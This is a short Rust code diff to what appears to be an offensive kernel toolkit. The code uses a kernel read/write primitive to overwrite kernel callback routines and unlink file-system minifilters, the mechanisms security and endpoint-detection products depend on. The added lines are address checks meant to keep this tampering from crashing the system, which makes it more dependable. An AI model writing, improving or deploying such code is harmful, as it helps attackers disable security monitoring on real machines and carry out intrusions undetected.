@@ -167,6 +167,11 @@ impl CallbackKit for CallbackNeutralizer {
                 if ctx == 0 {
                     continue;
                 }
+                // ctx must be a canonical kernel address — writing to a
+                // user-mode or non-canonical address is a triple-fault (BSOD).
+                if ctx < 0xFFFF_8000_0000_0000 {
+                    continue;
+                }
                 // The callback-context block's first QWORD is the routine
                 // address. Validate it's a real kernel pointer before overwriting.
                 let routine = krw.kread_u64(ctx).map_err(KitError::from)?;
@@ -224,6 +229,13 @@ impl MiniFilterUnlinker {
     /// walk) supplies the resolved filter base.
     pub fn unlink_filter(&self, krw: &dyn KernelRw, filter_kva: usize) -> Result<(), KitError> {
         let link_kva = filter_kva + flt::FLT_OBJECT_PRIMARY_LINK;
+        // Validate link_kva is a canonical kernel address before reading or
+        // writing — a corrupted filter_base can produce a user-mode KVA.
+        if link_kva < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture(
+                "filter PrimaryLink is non-canonical — corrupted filter base",
+            ));
+        }
         // LIST_ENTRY { Flink: *mut, Blink: *mut } — read both.
         let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
         let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
